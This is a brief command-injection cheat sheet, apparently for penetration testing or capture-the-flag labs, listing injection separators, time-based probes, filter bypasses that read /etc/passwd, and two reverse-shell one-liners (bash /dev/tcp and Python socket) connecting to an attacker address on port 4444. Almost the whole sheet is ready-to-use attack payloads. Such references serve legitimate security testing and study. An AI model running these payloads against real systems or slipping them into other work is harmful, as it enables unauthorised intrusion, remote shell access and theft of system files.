# Command Injection

**Quick Checklist**
- [ ] Separators work? (`;`, `|`, `&`, `&&`, `%0a`)
- [ ] Command substitution? (`` `id` ``, `$(id)`)
- [ ] Time-based delay? (`sleep 5`, `ping -c 5`)
- [ ] OS detection possible?
- [ ] OOB possible? (DNS / HTTP)

**Basic Tests**
```bash
; id
| id
&& id
`id`
$(id)
%0aid
```

**Time-Based**
```bash
; sleep 5
; ping -c 5 127.0.0.1
& timeout 5
```

**Reverse Shells**
```bash
; bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'
; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.x",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

**Bypasses**
```bash
cat${IFS}/etc/passwd
{cat,/etc/passwd}
w'h'o'am'i
$(echo whoami)
/usr/bin/id
```
